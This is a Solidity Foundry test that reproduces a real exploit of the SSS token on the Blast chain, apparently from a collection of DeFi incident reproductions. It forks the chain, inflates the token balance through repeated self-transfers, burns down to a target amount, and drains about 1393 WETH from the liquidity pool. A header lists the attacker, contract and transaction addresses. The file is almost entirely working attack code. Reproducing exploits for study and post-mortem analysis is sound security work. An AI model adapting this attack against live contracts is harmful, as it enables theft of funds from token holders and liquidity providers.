// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./interface.sol";
// @KeyInfo - Total Lost: $4.8M
// Attacker: 0x6a89a8C67B5066D59BF4D81d59f70C3976faCd0A
// Attack Contract: 0xDed85d83Bf06069c0bD5AA792234b5015D5410A9
// Vulnerable Contract: 0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed
// Attack Tx: https://blastscan.io/tx/0x62e6b906bb5aafdc57c72cd13e20a18d2de3a4a757cd2f24fde6003ce5c9f2c6

// @Analyses
// https://twitter.com/SSS_HQ/status/1771054306520867242
// https://twitter.com/dot_pengun/status/1770989208125272481

interface ISSS is IERC20 {
    function maxAmountPerAccount() external view returns (uint256);
    function maxAmountPerTx() external view returns (uint256);
    function burn(uint256) external;
}

contract SSSExploit is Test {
    address private constant POOL = 0x92F32553cC465583d432846955198F0DDcBcafA1;
    Uni_Router_V2 private constant ROUTER_V2 = Uni_Router_V2(0x98994a9A7a2570367554589189dC9772241650f6);
    IWETH private constant WETH = IWETH(payable(0x4300000000000000000000000000000000000004));
    ISSS private constant SSS = ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
    Uni_Pair_V2 private sssPool = Uni_Pair_V2(POOL);

    function setUp() public {
        vm.createSelectFork("blast", 1_110_245);
        WETH.approve(address(ROUTER_V2), type(uint256).max);
        SSS.approve(address(ROUTER_V2), type(uint256).max);
    }

    function getPath() internal view returns (address[] memory path) {
        path = new address[](2);
        path[0] = address(SSS);
        path[1] = address(WETH);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Attacker WETH balance before exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        uint256 ethFlashAmt = 1 ether;
        vm.deal(address(this), 0);
        vm.deal(address(this), ethFlashAmt);
        WETH.deposit{value: ethFlashAmt}();

        uint256 maxAmountPerTx = SSS.maxAmountPerTx();
        console.log("Max amount per transaction is", maxAmountPerTx);

        _executeSwapOnV2(address(SSS), true, ethFlashAmt);

        uint256 targetBal = ROUTER_V2.getAmountsIn(WETH.balanceOf(POOL) - 29.5 ether, getPath())[0];
        while (SSS.balanceOf(address(this)) < targetBal) {
            SSS.transfer(address(this), SSS.balanceOf(address(this)));
        }

        SSS.burn(SSS.balanceOf(address(this)) - targetBal);
        assertEq(SSS.balanceOf(address(this)), targetBal, "we exceeded target");

        uint256 bal = SSS.balanceOf(address(this));
        uint256 SBalBeforeOnPair = SSS.balanceOf(POOL);
        while (bal > 0) {
            uint256 toSell = bal > maxAmountPerTx ? maxAmountPerTx - 1 : bal;
            SSS.transfer(POOL, toSell);
            bal = SSS.balanceOf(address(this));
        }

        uint256 targetETH = ROUTER_V2.getAmountsOut(SSS.balanceOf(POOL) - SBalBeforeOnPair, getPath())[1];
        sssPool.swap(targetETH, 0, address(this), new bytes(0));
        sssPool.skim(address(this));

        WETH.transfer(address(1), ethFlashAmt);

        assertEq(WETH.balanceOf(address(this)), 1393.20696066122859944 ether, "Not expected WETH BAL");
        assertEq(SSS.balanceOf(address(this)), 0, "All SSS tokens didn't get sold");

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function _executeSwapOnV2(address token, bool buy, uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = buy ? address(WETH) : address(token);
        path[1] = buy ? address(token) : address(WETH);

        ROUTER_V2.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}